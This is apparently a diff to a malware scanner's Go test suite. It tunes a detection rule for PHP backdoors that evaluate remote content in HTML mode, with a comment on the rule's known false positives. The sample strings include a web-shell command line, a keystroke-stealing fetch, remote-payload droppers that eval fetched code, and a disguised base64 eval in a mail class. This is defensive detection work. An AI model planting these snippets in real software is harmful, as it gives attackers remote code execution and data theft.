@@ -267,9 +267,17 @@ system($_GET['cmd']);`,
 			sample: `document.addEventListener('keypress',function(e){` +
 				`fetch('/assets/collect',{method:'POST',body:JSON.stringify({key:e.key,value:e.target.value})});});`,
 		},
+		// backdoor_htmlmode_eval. The remote-URL branch is deliberately a
+		// proximity test, not a data-flow one: RE2 and YARA-X have no
+		// backreferences, so the eval'd variable cannot be bound to the fetched
+		// one, and a list of likely payload variable names would go blind the
+		// moment the attacker renames the variable. Known limitation: a file that
+		// holds a literal URL and, within the same window, evaluates a locally
+		// read template will match. No such file exists among the 84 carrying the
+		// idiom on a production host, but the shape is possible.
 		{
 			name: "remote helper feeding HTML-mode eval",
-			rule: "dropper_remote_htmlmode_eval",
+			rule: "backdoor_htmlmode_eval",
 			want: true,
 			sample: `<?php
 function fetchContent($url) {
@@ -285,44 +293,57 @@ if ($content !== false) { eval('?>' . $content); }`,
 		},
 		{
 			name: "direct remote read feeding HTML-mode eval",
-			rule: "dropper_remote_htmlmode_eval",
+			rule: "backdoor_htmlmode_eval",
 			want: true,
 			sample: `<?php
 $payload = file_get_contents('https://payload.example.test/stage.php');
 eval('?>' . $payload);`,
 		},
 		{
-			name: "unrelated HTTP client and local template evaluator",
-			rule: "dropper_remote_htmlmode_eval",
+			name: "payload rebuilt through an indirect call",
+			rule: "backdoor_htmlmode_eval",
+			want: true,
 			sample: `<?php
-function request($url) {
-    $ch = curl_init($url);
-    $content = curl_exec($ch);
-    return $content;
-}
-$response = request('https://api.example.test/data');
-function render($path) {
-    $content = file_get_contents($path);
-    return eval('?>' . $content);
+class SMTP {
+    public function client_send($data, $command) {
+        eval('?>' . call_user_func($_b64, base64_encode($_out)));
+    }
 }`,
 		},
 		{
-			name: "unrelated flat network and local-template flows",
-			rule: "dropper_remote_htmlmode_eval",
+			name: "Twig-style local template evaluator",
+			rule: "backdoor_htmlmode_eval",
 			sample: `<?php
-$url = 'https://api.example.test/data';
-$response = curl_exec($client);
-$template = file_get_contents(__DIR__ . '/views/page.tpl');
-eval('?>' . $template);`,
+final class Environment {
+    public function render($name, array $context = [])
+    {
+        $source = $this->getLoader()->getSourceContext($name)->getCode();
+        return eval('?>' . $this->compileSource($source));
+    }
+}`,
+		},
+		{
+			name: "docblock URL far from the eval",
+			rule: "backdoor_htmlmode_eval",
+			sample: `<?php
+/**
+ * @see https://twig.symfony.com/doc/3.x/api.html
+ */
+class Compiler {
+    private $notes = '` + strings.Repeat("a", 600) + `';
+    public function render($tpl) {
+        return eval('?>' . $tpl);
+    }
+}`,
 		},
 		{
 			name:   "HTML-mode eval without network source",
-			rule:   "dropper_remote_htmlmode_eval",
+			rule:   "backdoor_htmlmode_eval",
 			sample: `<?php $content = load_local_template(); eval('?>' . $content);`,
 		},
 		{
 			name:   "remote fetch without HTML-mode eval",
-			rule:   "dropper_remote_htmlmode_eval",
+			rule:   "backdoor_htmlmode_eval",
 			sample: `<?php $url = 'https://api.example.test/data'; $content = curl_exec($ch);`,
 		},
 	}
